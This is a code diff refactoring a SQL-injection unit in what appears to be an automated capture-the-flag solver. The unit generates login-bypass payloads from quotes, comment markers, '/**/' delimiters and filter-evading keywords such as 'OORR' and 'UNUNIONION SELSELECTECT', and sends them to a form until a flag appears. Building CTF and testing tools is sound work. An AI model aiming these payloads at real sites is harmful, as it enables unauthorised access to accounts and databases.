@@ -87,52 +87,54 @@ class Unit(web.WebUnit):
         ``(method, action, username, password, payload)``
         """
 
-        if self.action and self.method and self.username and self.password:
-            if self.action:
-                action = self.action[0].decode("utf-8")
-            if self.method:
-                method = self.method[0].decode("utf-8")
-            if self.username:
-                username = self.username[0].decode("utf-8")
-            if self.password:
-                password = self.password[0].decode("utf-8")
-
-            try:
-                method = vars(requests)[method.lower()]
-            except IndexError:
-                # Could not find a valid method... default to POST
-                method = requests.post
-
-            quotes_possibilities = ["'", '"']
-            comment_possibilities = ["--", "#", "/*", "%00"]
-            delimeter_possibilities = [" ", "/**/"]
-            test_possibilities = [
-                "OR",
-                "OORR",
-                "UNION SELECT",
-                "UNUNIONION SELSELECTECT",
-            ]
-
-            payloads = []
-            count_attempt = 0
-            for quote in quotes_possibilities:
-                for comment in comment_possibilities:
-                    for delimeter in delimeter_possibilities:
-                        for test in test_possibilities:
-                            payload = (
-                                quote
-                                + delimeter
-                                + test.replace(" ", delimeter)
-                                + delimeter
-                                + "1"
-                                + delimeter
-                                + comment
-                            )
-                            count_attempt += 1
-                            yield (method, action, username, password, payload)
-
-        else:
+        if (
+            not self.action
+            or not self.method
+            or not self.username
+            or not self.password
+        ):
             return  # This will tell THE WHOLE UNIT to stop!
+        action = self.action[0].decode("utf-8")
+        if self.method:
+            method = self.method[0].decode("utf-8")
+        if self.username:
+            username = self.username[0].decode("utf-8")
+        if self.password:
+            password = self.password[0].decode("utf-8")
+
+        try:
+            method = vars(requests)[method.lower()]
+        except IndexError:
+            # Could not find a valid method... default to POST
+            method = requests.post
+
+        quotes_possibilities = ["'", '"']
+        comment_possibilities = ["--", "#", "/*", "%00"]
+        delimeter_possibilities = [" ", "/**/"]
+        test_possibilities = [
+            "OR",
+            "OORR",
+            "UNION SELECT",
+            "UNUNIONION SELSELECTECT",
+        ]
+
+        payloads = []
+        count_attempt = 0
+        for quote in quotes_possibilities:
+            for comment in comment_possibilities:
+                for delimeter in delimeter_possibilities:
+                    for test in test_possibilities:
+                        payload = (
+                            quote
+                            + delimeter
+                            + test.replace(" ", delimeter)
+                            + delimeter
+                            + "1"
+                            + delimeter
+                            + comment
+                        )
+                        count_attempt += 1
+                        yield (method, action, username, password, payload)
 
     def evaluate(self, case: Any):
         """
@@ -175,11 +177,7 @@ class Unit(web.WebUnit):
             # We can't reach the site... stop trying this unit!
             return
 
-        # Hunt for flags. If we found one, stop all other requests!
-        hit = self.manager.find_flag(self, r.text)
-
-        # If we found a flag, stop trying SQL injection!!
-        if hit:
+        if hit := self.manager.find_flag(self, r.text):
             return
 
         # You should ONLY return what is "interesting"
